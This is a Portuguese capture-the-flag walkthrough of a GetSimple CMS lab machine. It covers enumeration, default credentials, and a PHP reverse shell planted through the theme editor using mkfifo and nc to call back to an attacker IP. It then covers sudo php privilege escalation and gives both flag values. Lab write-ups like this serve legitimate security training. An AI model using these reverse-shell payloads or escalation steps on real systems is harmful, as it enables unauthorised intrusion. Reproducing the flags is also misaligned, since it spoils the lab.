# Temos um teste agora :3, esssas são as flags necessárias:

TARGET = 10.129.178.56

## Spawn the target, gain a foothold and submit the contents of the user.txt flag.

> nmap -sV --open 10.129.178.56
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

> whatweb 10.129.178.56
http://10.129.178.56 [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.178.56], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]

* Nada no código fonte, está sendo execute um GetSimple, será um plugin? 
Vamos para o gobuster

> gobuster dir -u http://10.129.178.56/ -w /usr/share/dirb/wordlists/common.txt
admin/ -> Pag admin
backups/ -> nada
data/ -> 
http://10.129.178.56/data/cache/2a4c6447379fba09620ba05582eb61af.txt
{"status":"0","latest":"3.3.16","your_version":"3.3.15","message":"You have an old version - please upgrade"}
versão do GetSimple -> 3.3.15
user -> admin
email -> admin@gettingstarted.com
password -> admin

plugins/
InnovationPlugin.php
anonymous_data.pho

robots.txt
/server-status
/sitemap.xml
/theme

Podemos seguir com a busca do exploit para o GetSimple
Existe a possibilidade de colocar um tema em php e ele recebe scripts php

<?php system('rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 1234 >/tmp/f') ?>

conseguimos o primeiro shell
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> export TERM=xterm
Precisamos encontrar o user.txt flag
> sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php

### Primeira flag: 7002d65b149b0a4d19132a66feed21d8

##  After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.

Preciso escalar os privilégios
<?php system('rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 6666 >/tmp/f') ?>

Podemos utilizar esse script, pegar o binário dele e coloca esse binário como substituo do php, ou então executar o php passando o script que foi criado.

> sudo /usr/bin/php system('nc 10.10.16.5 6666')

<?php system('rm /tmp/g; mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.16.5 6666 >/tmp/g') ?>

<?php system('/bin/sh')?>

> sudo /usr/bin/php script2.php

### Segunda flag: f1fba6e9f71efb2630e6e34da6387842